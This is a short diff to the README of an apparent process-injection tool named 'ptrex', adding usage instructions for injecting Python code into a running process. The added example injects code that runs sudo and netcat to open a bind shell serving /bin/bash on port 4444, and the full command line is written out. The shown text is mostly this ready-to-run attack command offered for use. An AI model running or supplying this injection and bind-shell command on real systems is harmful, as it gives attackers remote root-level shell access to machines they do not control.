@@ -39,7 +39,13 @@ gcc -o ptrex ptrex.c
  ./ptrex 
 ```
 
-You can also inject your own python code: ./ptrex full_python_path newcmdline
+You can also inject your own python code: 
+
+./ptrex full_python_path newcmdline
+
+Example with 
+* own python binary: /home/dreg/tmp/python
+* bind bash shell python code: import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")
 ```
 ./ptrex /home/dreg/tmp/python 'import os; os.system("/usr/bin/sudo /bin/nc -lvp 4444 -e /bin/bash")'
 ```
